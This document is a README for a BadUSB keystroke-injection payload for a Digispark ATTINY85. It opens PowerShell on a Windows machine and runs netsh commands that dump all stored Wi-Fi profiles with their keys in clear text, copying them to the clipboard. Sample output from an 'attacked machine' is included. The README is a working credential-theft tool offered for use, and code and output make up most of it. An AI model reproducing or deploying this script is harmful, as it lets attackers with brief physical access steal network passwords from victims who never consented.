# Wifi Profile Grabber
## Description
This is a simple *keystroke injection* script designed for grabbing user's wifi credentials. 
## Specifications
* **Hardware** = Digispark ATTINY85
* **Platform** = Windows (PowerShell)
* **Implementation** = Arduino script
## Implementation
Script uses standard delay and keystoke commands. Inserting the bad usb will open PowerShell window. Credentials are obtained using the following simplified script:
```
$a = (netsh wlan show profiles) | Select-String ' :(.*)' // store found devices
$count = 1
$out = while($a.matches.groups[$count].value) { netsh wlan show profiles $a.matches.groups[$count].value.Trim() key=clear; $count+=2}
write-output $out | clip // copy to clipboard
```
Can be replaced with [Hak5's one-liner](https://shop.hak5.org/blogs/payloads).
## Output
Script will grab data of all stored wifi credentials from attacked machine. The following example showcases one profile:
```
Profile K. on interface Wi-Fi: 
======================================================================= 

Applied: All User Profile    

Profile information 
------------------- 
    Version                : 1
    Type                   : Wireless LAN
    Name                   : K.
    Control options        : 
        Connection mode    : Connect automatically
        Network broadcast  : Connect only if this network is broadcasting
        AutoSwitch         : Do not switch to other networks
        MAC Randomization  : Disabled

Connectivity settings 
--------------------- 
    Number of SSIDs        : 1
    SSID name              : "K."
    Network type           : Infrastructure
    Radio type             : [ Any Radio Type ]
    Vendor extension          : Not present

Security settings 
----------------- 
    Authentication         : WPA2-Personal
    Cipher                 : CCMP
    Authentication         : WPA2-Personal
    Cipher                 : GCMP
    Security key           : Present
    Key Content            : <PASSWORD>

Cost settings 
------------- 
    Cost                   : Fixed
    Congested              : No
    Approaching Data Limit : No
    Over Data Limit        : No
    Roaming                : No
    Cost Source            : Operator

```
